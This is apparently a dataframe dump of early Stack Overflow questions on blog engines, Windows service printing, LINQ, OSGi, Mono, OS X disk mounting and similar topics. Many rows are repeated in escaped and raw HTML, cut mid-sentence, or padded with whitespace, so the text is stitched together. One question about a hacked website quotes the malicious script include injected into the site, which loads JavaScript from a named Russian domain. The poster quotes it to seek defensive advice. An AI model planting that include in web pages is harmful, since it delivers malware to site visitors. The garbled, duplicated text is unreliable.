I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.&lt;/p&gt;\\r\\n\\r\\n&lt;p&gt;edit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.&lt;/p&gt;\\r\\n\\r\\n&lt;p&gt;another edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.

       "      <td>&lt;p&gt;I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it &lt;em&gt;seems&lt;/em&gt; that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:&lt;/p&gt;\\n\\n&lt;ul&gt;\\n&lt;li&gt;Multi-page printing will be a big headache.&lt;/li&gt;\\n&lt;li&gt;Still have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)&lt;/li&gt;\\n&lt;li&gt;If the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.&lt;/li&gt;\\n&lt;/ul&gt;\\n\\n&lt;p&gt;Has anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.&lt;/p&gt;\\n\\n&lt;p&gt;All help is appreciated.&lt;/p&gt;\\n\\n&lt;p&gt;EDIT: We are on version 2.0 of the .NET framework.&lt;/p&gt;\\n</td>\n",

       "35   <p>My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.</p>\\n\\n<p>I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): <a href=\"http://www.98hs.ru/js.js\" rel=\"nofollow\">http://www.98hs.ru/js.js</a> &lt;-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.</p>\\n\\n<p>So I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).</p>\\n\\n<p>I did a <a href=\"http://whois.domaintools.com/98hs.ru\" rel=\"nofollow\">whois on 98hs.ru</a> and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...</p>\\n\\n<p>I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?</p>\\n\\n<p>He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to <em>do</em> sftp on their site. I'm thinking his username and password got intercepted?</p>\\n\\n<p><strong>So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?</strong></p>\\n\\n<p>For the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):</p>\\n\\n<pre><code>&lt;!--script

       "61   <p>The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \\r\\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?<br>\\r\\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.</p>\\r\\n\\r\\n<p>edit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.</p>\\r\\n\\r\\n<p>another edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \n",

       "82   <p>Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?</p>\\n\\n<p>What level do you hold your code to when you create it for:</p>\\n\\n<p>a) yourself\\nb) your clients</p>\\n\\n<p>P.S. Jeff and company, why doesn't stack overflow validate? :)</p>\\n\\n<p><strong>EDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"</strong></p>\\n\\n<p><strong>I think I may post another

       "83   <p>I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it <em>seems</em> that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:</p>\\n\\n<ul>\\n<li>Multi-page printing will be a big headache.</li>\\n<li>Still have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)</li>\\n<li>If the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.</li>\\n</ul>\\n\\n<p>Has anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.</p>\\n\\n<p>All help is appreciated.</p>\\n\\n<p>EDIT: We are on version 2.0 of the .NET framework.</p>\\n

       "103  <p>So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.</p>\\n\\n<p>Here are some of the options:</p>\\n\\n<ul>\\n<li>JBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable</li>\\n<li>NAS - Slow but cheap and expandable, probably best for backups</li>\\n<li>DAS - A decent compromise, but generally accessible from only one or two machines</li>\\n<li>SAN - Expensive but very

       "146  <p>While trying to advocate more developer testing, I find the argument \"Isn't that QA's job?\" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?</p>\\n\\n<p>Clarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?</p>\\n

       "153  <p>I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (<a href=\"http://stackoverflow.com/questions/8050/beginners-guide-to-linq\">http://stackoverflow.com/questions/8050/beginners-guide-to-linq</a>), but had a follow-up question:</p>\\n\\n<p>We're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.</p>\\n\\n<p>So, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs?

       "169  <p>What makes a module/service/bit of application functionality a particularly good candidate for an OSGi module? </p>\\n\\n<p>I'm interested in using <a href=\"http://en.wikipedia.org/wiki/OSGi\">OSGi</a> in my applications. We're a Java shop and we use Spring pretty extensively, so I'm leaning toward using <a href=\"http://www.springframework.org/osgi\">Spring Dynamic Modules for OSGi(tm) Service Platforms</a>. I'm looking for a good way to incorporate a little bit of OSGi into an application as a trial. Has anyone here used this or a similar OSGi technology? Are there any pitfalls? </p>\\n\\n<p>@Nicolas - Thanks, I've seen that one. It's a good tutorial, but I'm looking more for ideas on how to do my first \"real\" OSGi bundle, as opposed to a Hello World example.</p>\\n\\n<p>@david - Thanks for the link! Ideally, with a greenfield app, I'd design the whole thing to be dynamic. What I'm looking for right now, though, is to introduce it in a small piece of an existing application. Assuming I can pick any piece of the app, what are some factors to consider that would make that piece better or worse as an OSGi guinea pig?</p>\\n

       "185  <p>I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development.

specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? </li>\\n<li>Which skill sets complement each other? </li>\\n<li>Are there any

       "200  <p>Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, <em>really</em> compatible enough to just take of and run already written code for Microsoft's runtime?</p>\\n

       "213  <p>I'm a bit newbieish when it comes to the deeper parts of OSX configuration and am having to put up with a fairly irritating niggle which while I can put up with it, I know under Windows I could have sorted in minutes.</p>\\n\\n<p>Basically, I have an external disk with two volumes: </p>\\n\\n<p>One is an HFS+ volume which I use for TimeMachine backups.\\nThe other, an NTFS volume that I use for general file copying etc on Mac and Windows boxes.</p>\\n\\n<p>So what happens is that whenever I plug in the disk into my Mac USB, OSX goes off and mounts both volumes and shows an icon on the desktop for each. The thing is that to remove the disk you have to eject the volume and in this case do it for both volumes, which causes an annoying warning dialog to be shown every time. </p>\\n\\n<p>What I'd prefer is some way to prevent the NTFS volume from auto-mounting altogether. I've done some hefty googling and here's a list of things I've tried so far:</p>\\n\\n<ul>\\n<li>I've tried going through options in Disk Utility</li>\\n<li>I've tried setting AutoMount to No in /etc/hostconfig but that is a bit too global for my liking.</li>\\n<li>I've also tried the suggested approach to putting settings in fstab but it appears the OSX (10.5) is ignoring these settings.</li>\\n</ul>\\n\\n<p>Any other suggestions would be welcomed. Just a little dissapointed that I can't just tick a box somewhere (or untick).</p>\\n\\n<p>EDIT: Thanks heaps to hop for the answer it worked a treat. For the record it turns out that it wasn't OSX not picking up the settings I actually had \"msdos\" instead of \"ntfs\" in the fs type column.</p>\\n

TCP duplex on the same connection is needed for this, a dual binding does not work since a port has to be opened on the client firewall.</li>\\n<li>Clients sends heartbeats to server at regular intervals (perhaps every 15 mins) so server knows client is still alive.</li>\\n<li>Server is IIS7 with WAS.</li>\\n</ul>\\n\\n<p>The solution seems to be duplex netTcpBinding.

       "732  <p>I find working on the command line in Windows frustrating, primarily because the console window is wretched to use compared to terminal applications on linux and OS X such as \"rxvt\", \"xterm\", or \"Terminal\".  Major complaints:</p>\\n\\n<ol>\\n<li><p>No standard copy/paste.  You have to turn on \"mark\" mode and it's only available from a multi-level popup triggered by the (small) left hand corner button.  Then copy and paste need to be invoked from the same menu</p></li>\\n<li><p>You can't arbitrarily resize the window by dragging, you need to set a preference (back to the multi-level popup) each time you want to resize a window</p></li>\\n<li><p>You can only make the window so big before horizontal scroll bars enter the picture. Horizontal scroll bars suck.</p></li>\\n<li><p>With the cmd.exe shell, you can't navigate to folders with \\\\netpath notation (UNC?), you need to map a network drive.  This sucks when working on multiple machines that are going to have different drives mapped</p></li>\\n</ol>\\n\\n<p>Are there any tricks or applications, (paid or otherwise), that address these

I mean with the idea of facilitating builds, deploys release, and etc.</p>\\n\\n<p>I recently used a <a href=\"http://maven.apache.org/guides/introduction/introduction-to-the-standard-directory-layout.html\">Maven structure</a> for a java project, but I am not sure it's the best structure for a non-maven driven project.</p>\\n\\n<p>So, I have two questions: When you guys start new projects, what structure you use? And: What if you need to integrate two different languages, like for example java classes into a PHP application; PHP files are source files, web files, you you use a /src, /classes, webapps/php ? What are your choices in such scenarios. </p>\\n\\n<p>As a note: I am wondering also what are you choices for directories names. I like the 3-letters names (src, lib, bin, web, img, css, xml, cfg) but what are your opinions about descriptive names like libraris, sources or htdocs/public_html ?</p>\\n

       "766  <p>I work with embedded Linux systems that sometimes want to get their IP address from a DHCP server.  The DHCP Client client we use (<a href=\"http://www.phystech.com/download/dhcpcd.html\" rel=\"nofollow\" title=\"DHCPCD\">dhcpcd</a>) has limited retry logic.  If our device starts up without any DHCP server available and times out, dhcpcd will exit and the device will never get an IP address until it's rebooted with a DHCP server visible/connected.  I can't be the only one that has this problem.  The problem doesn't even seem to be specific to embedded systems (though it's worse there).  How do you handle this?  Is there a more robust client available?  </p>\\n

       "801  <p>I worked on an embedded system this summer written in straight C.  It was an existing project that the company I work for had taken over.  I have become quite accustomed to writing unit tests in Java using JUnit but was at a loss as to the best way to write unit tests for existing code (which needed refactoring) as well as new code added to the system.</p>\\n\\n<p>Are there any projects out there that make unit testing plain C code as easy as unit testing Java code with JUnit?  Any insight that would apply specifically to embedded development (cross-compiling to arm-linux platform) would be greatly appreciated.</p>\\n

       "828  <p>I'd like to experiment with burn-down and planning game with the team I'm on.  People on my team are interested in making it happen, however I'm sure someone has done this before and has learned some lessons we hopefully don't have to repeat.  Does anyone know of an example Excel (or other tool) template available for burn-down or planning game activities?</p>\\n

       "837  <p>A friend is having mysterious health problems that we're trying to track down.  One thing that would help would be to improve his record keeping by giving him a handheld device with which he could keep track of various details of his day including diet and environmental factors.</p>\\n\\n<p>We will be getting him a device but haven't decided on Palm vs. Windows Mobile vs. other.  I'd like to find some existing software but so far haven't been able to find something that is general enough or customizable to fit our needs.  Ideally I'd like to find an open source project that I can join and contribute while customizing the software to do what I need it to, which I haven't even totally defined yet.</p>\\n\\n<p>I'm a C++ developer (way too) familiar with MSVS6 but would be happy to have an excuse to get into .NET or other modern frameworks.  But if the easiest and quickest option is to work with something in C for the Palm I'd be happy to do that as well.  (I've found a good but somewhat dated reference for <a href=\"http://answers.google.com/answers/threadview/id/123584.html\" rel=\"nofollow\">C++ programming for the Palm</a>)  Similar and more recent info like this is what I'm looking for.</p>\\n\\n<p>Thanks for any advice or suggestions about how to get started with this.  </p>\\n

those answers, too) -- but I'm really hoping there's something in CSS/HTML directly that works across all browsers.</p>\\n

       "945  <p>I'm using KVM to run a Windows virtual machine on my Linux box. Networking is accomplished through a tap device, hooked into a bridged Ethernet device, which allows the Windows VM to basically appear like a separate physical computer on my network. This is pretty nice.</p>\\n\\n<p>However, my understanding is that most, if not all, wireless drivers can't support bridging. I'd really like to be able to roam a little more freely while I'm working -- does anyone know of an effective workaround?</p>\\n\\n<p>User-mode networking won't work, as I have to use some Windows VPN software that wants lower-level networking access.</p>\\n

He isn't technical at all, and built the whole thing with a WYSIWYG editor.&lt;/p&gt;\\n\\n&lt;p&gt;I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): &lt;a href=\"http://www.98hs.ru/js.js\" rel=\"nofollow\"&gt;http://www.98hs.ru/js.js&lt;/a&gt; &amp;lt;-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.&lt;/p&gt;\\n\\n&lt;p&gt;So I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).&lt;/p&gt;\\n\\n&lt;p&gt;I did a &lt;a href=\"http://whois.domaintools.com/98hs.ru\" rel=\"nofollow\"&gt;whois on 98hs.ru&lt;/a&gt; and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...&lt;/p&gt;\\n\\n&lt;p&gt;I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?&lt;/p&gt;\\n\\n&lt;p&gt;He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to &lt;em&gt;do&lt;/em&gt; sftp on their site. I'm thinking his username and password got intercepted?&lt;/p&gt;\\n\\n&lt;p&gt;&lt;strong&gt;So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?&lt;/strong&gt;&lt;/p&gt;\\n\\n&lt;p&gt;For the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):&lt;/p&gt;\\n\\n&lt;pre&gt;&lt;code&gt;&amp;lt;!--script src=http://www.98hs.ru/js.js&amp;gt;&amp;lt;/script&amp;gt;&amp;lt;script

I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.&lt;/p&gt;\\r\\n\\r\\n&lt;p&gt;edit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.&lt;/p&gt;\\r\\n\\r\\n&lt;p&gt;another edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.

The thing is that to remove the disk you have to eject the volume and in this case do it for both volumes, which causes an annoying warning dialog to be shown every time. &lt;/p&gt;\\n\\n&lt;p&gt;What I'd prefer is some way to prevent the NTFS volume from auto-mounting altogether. I've done some hefty googling and here's a list of things I've tried so far:&lt;/p&gt;\\n\\n&lt;ul&gt;\\n&lt;li&gt;I've tried going through options in Disk Utility&lt;/li&gt;\\n&lt;li&gt;I've tried setting AutoMount to No in /etc/hostconfig but that is a bit too global for my liking.&lt;/li&gt;\\n&lt;li&gt;I've also tried the suggested approach to putting settings in fstab but it appears the OSX (10.5) is ignoring these settings.&lt;/li&gt;\\n&lt;/ul&gt;\\n\\n&lt;p&gt;Any other suggestions would be welcomed. Just a little dissapointed that I can't just tick a box somewhere (or untick).&lt;/p&gt;\\n\\n&lt;p&gt;EDIT: Thanks heaps to hop for the answer it worked a treat.

       "35   <p>My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.</p>\\n\\n<p>I popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): <a href=\"http://www.98hs.ru/js.js\" rel=\"nofollow\">http://www.98hs.ru/js.js</a> &lt;-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.</p>\\n\\n<p>So I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).</p>\\n\\n<p>I did a <a href=\"http://whois.domaintools.com/98hs.ru\" rel=\"nofollow\">whois on 98hs.ru</a> and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...</p>\\n\\n<p>I have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?</p>\\n\\n<p>He was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to <em>do</em> sftp on their site. I'm thinking his username and password got intercepted?</p>\\n\\n<p><strong>So, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?</strong></p>\\n\\n<p>For the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):</p>\\n\\n<pre><code>&lt;!--script

       "61   <p>The company I work for is wanting to add blog functionality to our website and they were looking to spend an awful amount of money to have some crap being built on top of a CMS they purchased (sitecore).  I pointed them to Telligent's Community Server and  we had a sales like meeting today to get the Marketing folks on board. \\r\\nMy question is if anyone has had issues working with Community Server, skinning it and extending it?<br>\\r\\nI wanted to explain a bit why I am thinking Community Server, the company is wanting multiple blogs with multiple authors.  I want to be out of the admin part of this as much as possible and didn't think there were too many engines that having multiple blogs didn't mean db work.  I also like the other functionality that Community Server provides and think the company will find it useful, particularly the media section as right now we have some really shotty way of dealing with whitepapers and stuff.</p>\\r\\n\\r\\n<p>edit: We are actually using the Sitecore blog module for a single blog on our intranet (which is actually what the CMS is serving).  Some reasoning for why I don't like it for our public site are they are on different servers, it doesn't support multiple authors, there is no built in syndication, it is a little flimsy feeling to me from looking at the source and I personally think the other features of Community Server make its price tag worth it.</p>\\r\\n\\r\\n<p>another edit: Need to stick to .net software that run on sql server in my company's case, but I don't mind seeing recommendations for others.  ExpressionEngine looks promising, will try it out on my personal box.</p>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         \n",

       "82   <p>Even though I always strive for complete validation these days, I often wonder if it's a waste of time.  If the code runs and it looks the same in all browsers (I use browsershots.org to verify) then do I need to take it any further or am I just being overly anal?</p>\\n\\n<p>What level do you hold your code to when you create it for:</p>\\n\\n<p>a) yourself\\nb) your clients</p>\\n\\n<p>P.S. Jeff and company, why doesn't stack overflow validate? :)</p>\\n\\n<p><strong>EDIT: Some good insights, I think that since I've been so valid-obsessed for so long I program knowing what will cause problems and what won't so I'm in a better position than people who create a site first and then \"go back and fix the validation problems\"</strong></p>\\n\\n<p><strong>I think I may post another

       "83   <p>I am working on a project right now that involves receiving a message from another application, formatting the contents of that message, and sending it to a printer.  Technology of choice is C# windows service.  The output could be called a report, I suppose, but a reporting engine is not necessary.  A simple templating engine, like StringTemplate, or even XSLT outputting HTML would be fine.  The problem I'm having is finding a free way to print this kind of output from a service.  Since it <em>seems</em> that it will work, I'm working on a prototype using Microsoft's RDLC, populating a local report and then rendering it as an image to a memory stream, which I will then print.  Issues with that are:</p>\\n\\n<ul>\\n<li>Multi-page printing will be a big headache.</li>\\n<li>Still have to use PrintDocument to print the memory stream, which is unsupported in a Windows Service (though it may work - haven't gotten that far with the prototype yet)</li>\\n<li>If the data coming across changes, I have to change the dataset, and the class that the data is being deserialized into.  bad bad bad.</li>\\n</ul>\\n\\n<p>Has anyone had to do anything remotely like this?  Any advice?  I already posed a question about printing HTML without user input, and after wasting about 3 days on that, I have come to the conclusion that it cannot be done, at least not with any freely available tool.</p>\\n\\n<p>All help is appreciated.</p>\\n\\n<p>EDIT: We are on version 2.0 of the .NET framework.</p>\\n

       "103  <p>So, the answer should probably be presented in tiers for the size of the application, but I'm wondering about people's experience with choosing where the disk drives used by the database should reside.</p>\\n\\n<p>Here are some of the options:</p>\\n\\n<ul>\\n<li>JBOD - (just a bunch of disks) Old fashioned internal disks - fast but not very expandable</li>\\n<li>NAS - Slow but cheap and expandable, probably best for backups</li>\\n<li>DAS - A decent compromise, but generally accessible from only one or two machines</li>\\n<li>SAN - Expensive but very

       "146  <p>While trying to advocate more developer testing, I find the argument \"Isn't that QA's job?\" is used a lot.  In my mind, it doesn't make sense to give the QA team all testing responsibilities, but at the same time Spolsky and others say you shouldn't be using the $100/hr developers to do something a $30/hr tester could be doing.  What are the experiences of others in a company with a dedicated QA team?  Where should the division of work be drawn?</p>\\n\\n<p>Clarification: I meant QA as a validation and verification team. Devs should not be doing the validation (customer-focused testing), but where is the verification (functional testing) division point?</p>\\n

       "153  <p>I took a look at the \"Beginner's Guide to LINQ\" post here on StackOverflow (<a href=\"http://stackoverflow.com/questions/8050/beginners-guide-to-linq\">http://stackoverflow.com/questions/8050/beginners-guide-to-linq</a>), but had a follow-up question:</p>\\n\\n<p>We're about to ramp up a new project where nearly all of our database op's will be fairly simple data retrievals (there's another segment of the project which already writes the data). Most of our other projects up to this point make use of stored procedures for such things. However, I'd like to leverage LINQ-to-SQL if it makes more sense.</p>\\n\\n<p>So, the question is this: For simple data retrievals, which approach is better, LINQ-to-SQL or stored procs?

       "169  <p>What makes a module/service/bit of application functionality a particularly good candidate for an OSGi module? </p>\\n\\n<p>I'm interested in using <a href=\"http://en.wikipedia.org/wiki/OSGi\">OSGi</a> in my applications. We're a Java shop and we use Spring pretty extensively, so I'm leaning toward using <a href=\"http://www.springframework.org/osgi\">Spring Dynamic Modules for OSGi(tm) Service Platforms</a>. I'm looking for a good way to incorporate a little bit of OSGi into an application as a trial. Has anyone here used this or a similar OSGi technology? Are there any pitfalls? </p>\\n\\n<p>@Nicolas - Thanks, I've seen that one. It's a good tutorial, but I'm looking more for ideas on how to do my first \"real\" OSGi bundle, as opposed to a Hello World example.</p>\\n\\n<p>@david - Thanks for the link! Ideally, with a greenfield app, I'd design the whole thing to be dynamic. What I'm looking for right now, though, is to introduce it in a small piece of an existing application. Assuming I can pick any piece of the app, what are some factors to consider that would make that piece better or worse as an OSGi guinea pig?</p>\\n

       "185  <p>I am a student studying software development, and I feel programming, in general, is too broad of a subject to try to know everything. To be proficient, you have to decide which areas to focus your learning and understanding. Certain skill sets synergize with each other, like data-driven web development and SQL experience. However, all the win32 API experience in the world may not directly apply to linux development. This leads me to believe, as a beginning programmer, I should start deciding where I want to specialize after I have general understanding of the basic principles of software development.

specializations have more long-term value, both as a foundation for other specializations and/or as marketable skills? </li>\\n<li>Which skill sets complement each other? </li>\\n<li>Are there any

       "200  <p>Has anyone used Mono, the open source .NET implementation on a large or medium sized project? I'm wondering if it's ready for real world, production environments. Is it stable, fast, compatible, ... enough to use? Does it take a lot of effort to port projects to the Mono runtime, or is it really, <em>really</em> compatible enough to just take of and run already written code for Microsoft's runtime?</p>\\n

       "213  <p>I'm a bit newbieish when it comes to the deeper parts of OSX configuration and am having to put up with a fairly irritating niggle which while I can put up with it, I know under Windows I could have sorted in minutes.</p>\\n\\n<p>Basically, I have an external disk with two volumes: </p>\\n\\n<p>One is an HFS+ volume which I use for TimeMachine backups.\\nThe other, an NTFS volume that I use for general file copying etc on Mac and Windows boxes.</p>\\n\\n<p>So what happens is that whenever I plug in the disk into my Mac USB, OSX goes off and mounts both volumes and shows an icon on the desktop for each. The thing is that to remove the disk you have to eject the volume and in this case do it for both volumes, which causes an annoying warning dialog to be shown every time. </p>\\n\\n<p>What I'd prefer is some way to prevent the NTFS volume from auto-mounting altogether. I've done some hefty googling and here's a list of things I've tried so far:</p>\\n\\n<ul>\\n<li>I've tried going through options in Disk Utility</li>\\n<li>I've tried setting AutoMount to No in /etc/hostconfig but that is a bit too global for my liking.</li>\\n<li>I've also tried the suggested approach to putting settings in fstab but it appears the OSX (10.5) is ignoring these settings.</li>\\n</ul>\\n\\n<p>Any other suggestions would be welcomed. Just a little dissapointed that I can't just tick a box somewhere (or untick).</p>\\n\\n<p>EDIT: Thanks heaps to hop for the answer it worked a treat. For the record it turns out that it wasn't OSX not picking up the settings I actually had \"msdos\" instead of \"ntfs\" in the fs type column.</p>\\n

TCP duplex on the same connection is needed for this, a dual binding does not work since a port has to be opened on the client firewall.</li>\\n<li>Clients sends heartbeats to server at regular intervals (perhaps every 15 mins) so server knows client is still alive.</li>\\n<li>Server is IIS7 with WAS.</li>\\n</ul>\\n\\n<p>The solution seems to be duplex netTcpBinding.

       "732  <p>I find working on the command line in Windows frustrating, primarily because the console window is wretched to use compared to terminal applications on linux and OS X such as \"rxvt\", \"xterm\", or \"Terminal\".  Major complaints:</p>\\n\\n<ol>\\n<li><p>No standard copy/paste.  You have to turn on \"mark\" mode and it's only available from a multi-level popup triggered by the (small) left hand corner button.  Then copy and paste need to be invoked from the same menu</p></li>\\n<li><p>You can't arbitrarily resize the window by dragging, you need to set a preference (back to the multi-level popup) each time you want to resize a window</p></li>\\n<li><p>You can only make the window so big before horizontal scroll bars enter the picture. Horizontal scroll bars suck.</p></li>\\n<li><p>With the cmd.exe shell, you can't navigate to folders with \\\\netpath notation (UNC?), you need to map a network drive.  This sucks when working on multiple machines that are going to have different drives mapped</p></li>\\n</ol>\\n\\n<p>Are there any tricks or applications, (paid or otherwise), that address these

I mean with the idea of facilitating builds, deploys release, and etc.</p>\\n\\n<p>I recently used a <a href=\"http://maven.apache.org/guides/introduction/introduction-to-the-standard-directory-layout.html\">Maven structure</a> for a java project, but I am not sure it's the best structure for a non-maven driven project.</p>\\n\\n<p>So, I have two questions: When you guys start new projects, what structure you use? And: What if you need to integrate two different languages, like for example java classes into a PHP application; PHP files are source files, web files, you you use a /src, /classes, webapps/php ? What are your choices in such scenarios. </p>\\n\\n<p>As a note: I am wondering also what are you choices for directories names. I like the 3-letters names (src, lib, bin, web, img, css, xml, cfg) but what are your opinions about descriptive names like libraris, sources or htdocs/public_html ?</p>\\n

